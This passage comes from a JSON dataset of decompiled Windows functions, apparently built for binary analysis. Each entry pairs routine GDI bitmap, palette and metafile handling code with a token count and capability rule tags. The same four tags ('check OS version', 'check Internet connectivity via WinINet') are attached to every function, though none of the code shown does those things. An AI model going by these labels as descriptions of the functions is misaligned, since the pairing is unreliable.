        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042b51c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x42b537;\n    var_4h = param_2;\n    fcn.0042b3b8();\n    puStack172 = 0x42b547;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x42b558;\n        iVar2 = fcn.00429cbc();\n        if (iVar2 == var_eh) goto code_r0x0042b563;\n    }\n    puStack172 = 0x42b563;\n    fcn.00428e5c();\ncode_r0x0042b563:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x42b56f;\n    lpbBuffer = fcn.00402ef0();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x42b68b;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.0042b51c::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.00428e5c();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.0042b51c::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.0042b51c::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.00428e5c();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402f0c(0x42b692);\n    return;\n}\n",
        "token_count": 949
    },
    "0042b7f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b7f4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.0042b3b8();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.0042b944();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0042b830": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b830(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.0042b3b8();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.0042b944();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0042ba48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ba48(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x42ba68;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x42ba79;\n            uVar2 = fcn.00402ef0();\n            uStack40 = 0x42bac4;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041b6f0();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402f0c(0x42bacb);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "0042bad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042bad4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x42baf9;\n    fcn.00403ae4();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x42bb2b;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x42bb42;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x42bb4e;\n    fcn.00429cbc();\n    uStack76 = 0;\n    puStack80 = 0x42bb59;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x42bc0f;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x42bb7d;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x42bb88;\n    uVar4 = fcn.00402ef0();\n    uStack116 = 0x42bbef;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.00428ebc();\n    }\n    fcn.0041b6f0();\n    fcn.0041b6f0();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402f0c(0x42bbf6);\n    return;\n}\n",
        "token_count": 811
    },
    "0042be1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042be1c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x42be2c;\n    var_8h = fcn.00419980();\n    uStack24 = 0x42beba;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x42be57;\n            var_ch = fcn.00419610();\n            puStack32 = 0x42be62;\n            cVar1 = fcn.004289f8();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x42be92;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0042bfac();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x42be99;\n                uStack36 = 0x42be91;\n                fcn.00428a54();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42bec1;\n    uStack24 = 0x42beb9;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 451
    },
    "0042bec8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bec8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x42bee1;\n        iVar1 = fcn.00419980();\n        uStack24 = 0x42bf38;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419610();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.0042bfac();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x42bf3f;\n        uStack24 = 0x42bf37;\n        fcn.004199e4();\n        return;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0042bfac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bfac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x42bfc9;\n        fcn.0042881c();\n        uStack20 = 0x42c040;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.00428be8();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00419994();\n        *in_FS_OFFSET = uVar1;\n        fcn.00428a54(0x42c047);\n        return;\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "0042c04c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042c04c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x42c06a;\n        fcn.0042881c();\n        uStack24 = 0x42c12b;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.0042d460();\n        fcn.0042bec8();\n        fcn.0042d560();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.00428be8();\n        fcn.004198f8();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00428a54(0x42c132);\n        return;\n    }\n    return;\n}\n",
        "token_count": 484
    },
    "0042c13c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042c13c(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00404640();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0042c2c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042c2c0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "0042c30c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c30c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x42c374;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.0042bec8();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.0042c30c::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x42c391;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x42c39b;\n                fcn.00428e44();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x42c3a2;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x42c3a7;\n        iStack188 = fcn.00428f64();\n        puStack192 = 0x42c3b3;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x42c3b8;\n        hdcDest = fcn.00428f64();\n        uStack196 = 0x42c95a;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x42c3ff;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x42c404;\n                var_10h = fcn.00428f64();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x42c423;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x42c428;\n                var_10h = fcn.00428f64();\n            }\n            uStack216 = 0x42c673;\n            fcn.00428f64();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x42c680;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x42c685;\n            var_14h = fcn.00428f64();\n            iStack228 = 0x42c90b;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x42c8fa;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x42c6c0;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x42c6cc;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x42c8d8;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x42c7b9;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00428438();\n                puStack288 = 0x42c70d;\n                fcn.004181c0(&fcn.0042c30c::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.0042c30c::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x42c71d;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x42c72b;\n                iStack296 = fcn.0042767c();\n                iStack300 = hdcDest;\n                puStack304 = 0x42c735;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x42c740;\n                fcn.004283fc();\n                puStack304 = 0x42c745;\n                puStack304 = fcn.0042767c();\n                iStack308 = hdcDest;\n                puStack312 = 0x42c74f;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x42c770;\n                    var_30h = fcn.0042767c();\n                    puStack312 = 0x42c77e;\n                    fcn.004283fc();\n                    puStack312 = 0x42c783;\n                    var_2ch = fcn.0042767c();\n                    puStack312 = &fcn.0042c30c::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x42c7cc;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x42c7d1;\n                var_20h = fcn.00428f64();\n                iStack308 = 0x42c8ae;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00428f64();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.0042767c();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.004283fc();\n                    uVar6 = fcn.0042767c();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00428f64();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x42c8b5);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x42c8df;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x42c8d7;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x42c43a;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402ef0();\n        uStack208 = 0x42c664;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x42c473;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x42c480;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x42c52a;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x42c57b;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x42c550;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x42c588;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x42c50e;\n                fcn.00429700();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x42c5b1;\n            fcn.0042c2c0();\n            iStack232 = 0x42c5c7;\n            fcn.004030ec();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.0042c30c::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x42c5de;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x42c5e3;\n        var_10h = fcn.00428f64();\n        if (var_28h == 0) {\n            iStack256 = 0x42c5f1;\n            fcn.00428ebc();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x42c66b;\n            puStack248 = 0x42c663;\n            uVar8 = fcn.00402f0c();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404f60();\n        fcn.00404f60();\n    }\n    return var_10h;\n}\n",
        "token_count": 3819
    },
    "0042c970": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
